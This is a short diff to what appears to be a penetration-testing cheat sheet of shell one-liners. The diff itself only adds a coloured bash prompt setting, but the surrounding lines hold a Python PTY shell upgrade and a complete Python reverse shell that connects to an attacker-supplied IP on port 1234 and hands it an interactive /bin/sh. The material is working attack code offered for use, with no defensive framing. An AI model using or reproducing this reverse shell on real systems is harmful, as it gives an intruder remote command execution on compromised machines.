@@ -4,6 +4,7 @@
 -----
 python -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=linux
+PS1='\e[33;1m\u@\h: \e[31m\W\e[0m\$ 
 -----
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);          s.connect(("$ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'
 -----
